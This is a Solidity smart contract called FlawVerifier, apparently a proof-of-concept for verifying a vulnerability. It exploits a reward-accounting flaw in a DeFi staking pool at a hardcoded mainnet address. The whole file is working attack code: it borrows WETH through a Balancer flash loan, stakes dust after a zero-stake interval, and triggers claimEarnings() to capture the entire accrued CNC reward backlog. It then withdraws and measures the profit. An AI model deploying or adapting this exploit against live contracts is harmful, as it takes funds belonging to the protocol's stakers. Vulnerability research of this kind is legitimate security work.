// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IConicPool {
    function underlying() external view returns (address);

    function rewardManager() external view returns (address);

    function controller() external view returns (address);

    function deposit(
        uint256 underlyingAmount,
        uint256 minLpReceived,
        bool stake
    ) external returns (uint256);

    function unstakeAndWithdraw(
        uint256 conicLpAmount,
        uint256 minUnderlyingReceived
    ) external returns (uint256);
}

interface IController {
    function lpTokenStaker() external view returns (address);
}

interface ILpTokenStaker {
    function getBalanceForPool(address conicPool) external view returns (uint256);

    function getUserBalanceForPool(
        address conicPool,
        address account
    ) external view returns (uint256);
}

interface IRewardManager {
    function claimEarnings()
        external
        returns (uint256 cncRewards, uint256 crvRewards, uint256 cvxRewards);
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IBalancerFlashLoanRecipient {
    address internal constant TARGET_POOL = 0xBb787d6243a8D450659E09ea6fD82F1C859691e9;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CNC = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant ATTACK_STAKE = 0.01 ether;
    uint256 internal constant BALANCER_FLASH_WETH = 0.02 ether;

    uint256 internal _profitAmount;
    uint256 internal _profitBalanceBefore;
    bool internal _insideFlashLoan;

    error WrongUnderlying(address actualUnderlying);
    error ExistingStakeBlocksPath(uint256 totalStaked);
    error InsufficientDirectCapital(uint256 have, uint256 need);
    error UnauthorizedFlashLoanCallback(address caller);
    error UnexpectedFlashLoan(uint256 tokenCount, uint256 amountCount, uint256 feeCount);
    error UnexpectedFlashLoanToken(address token);
    error DepositDidNotCreateStake();
    error NoRewardBacklogAfterZeroStake();
    error FlashLoanRepaymentFailed(uint256 have, uint256 owe);
    error NoNetProfit(uint256 initialBalance, uint256 finalBalance);

    constructor() {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _profitBalanceBefore = IERC20(CNC).balanceOf(address(this));

        address underlying = IConicPool(TARGET_POOL).underlying();
        if (underlying != WETH) {
            revert WrongUnderlying(underlying);
        }

        require(IERC20(WETH).approve(TARGET_POOL, type(uint256).max), "WETH_APPROVE_FAILED");

        uint256 directWeth = IERC20(WETH).balanceOf(address(this));
        if (directWeth >= ATTACK_STAKE) {
            _executeAttack(ATTACK_STAKE);
            _finalizeProfit();
            return;
        }

        // The exploit path remains unchanged: become the first staker after a zero-stake
        // interval, then trigger the first reward checkpoint via claimEarnings(). The public
        // flash loan is only a temporary funding leg because the verifier is deployed empty.
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BALANCER_FLASH_WETH;

        _insideFlashLoan = true;
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes(""));
        _insideFlashLoan = false;

        _finalizeProfit();
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        if (msg.sender != BALANCER_VAULT) {
            revert UnauthorizedFlashLoanCallback(msg.sender);
        }
        if (!_insideFlashLoan || tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) {
            revert UnexpectedFlashLoan(tokens.length, amounts.length, feeAmounts.length);
        }
        if (tokens[0] != WETH) {
            revert UnexpectedFlashLoanToken(tokens[0]);
        }

        // Only a dust stake is needed to capture the entire zero-stake backlog, so the
        // remainder of the borrowed WETH stays idle as a realistic repayment buffer.
        _executeAttack(ATTACK_STAKE);

        uint256 repayment = amounts[0] + feeAmounts[0];
        uint256 wethBalance = IERC20(WETH).balanceOf(address(this));
        if (wethBalance < repayment) {
            revert FlashLoanRepaymentFailed(wethBalance, repayment);
        }
        require(IERC20(WETH).transfer(BALANCER_VAULT, repayment), "FLASH_REPAY_FAILED");
    }

    function profitToken() external pure returns (address) {
        return CNC;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeAttack(uint256 stakeAmount) internal {
        if (stakeAmount < ATTACK_STAKE) {
            revert InsufficientDirectCapital(stakeAmount, ATTACK_STAKE);
        }

        ILpTokenStaker staker = _staker();
        uint256 totalStakedBefore = staker.getBalanceForPool(TARGET_POOL);
        if (totalStakedBefore != 0) {
            revert ExistingStakeBlocksPath(totalStakedBefore);
        }

        // Exploit paths 1 and 2: rewards kept accruing while the pool had zero staked supply,
        // and lastHoldings was left stale because poolCheckpoint() skipped _updateEarned().
        IConicPool(TARGET_POOL).deposit(ATTACK_STAKE, 0, true);

        uint256 attackerStake = staker.getUserBalanceForPool(TARGET_POOL, address(this));
        if (attackerStake == 0) {
            revert DepositDidNotCreateStake();
        }

        // Exploit path 3: the first post-idle claimer forces accountCheckpoint()/poolCheckpoint()
        // through claimEarnings(), so the entire backlog is spread over only this dust stake.
        (uint256 cncRewards, uint256 crvRewards, uint256 cvxRewards) = _rewardManager().claimEarnings();
        if (cncRewards == 0 && crvRewards == 0 && cvxRewards == 0) {
            revert NoRewardBacklogAfterZeroStake();
        }

        IConicPool(TARGET_POOL).unstakeAndWithdraw(attackerStake, 0);
    }

    function _finalizeProfit() internal {
        uint256 profitBalanceAfter = IERC20(CNC).balanceOf(address(this));
        if (profitBalanceAfter <= _profitBalanceBefore) {
            revert NoNetProfit(_profitBalanceBefore, profitBalanceAfter);
        }
        _profitAmount = profitBalanceAfter - _profitBalanceBefore;
    }

    function _rewardManager() internal view returns (IRewardManager) {
        return IRewardManager(IConicPool(TARGET_POOL).rewardManager());
    }

    function _staker() internal view returns (ILpTokenStaker) {
        return ILpTokenStaker(IController(IConicPool(TARGET_POOL).controller()).lpTokenStaker());
    }
}
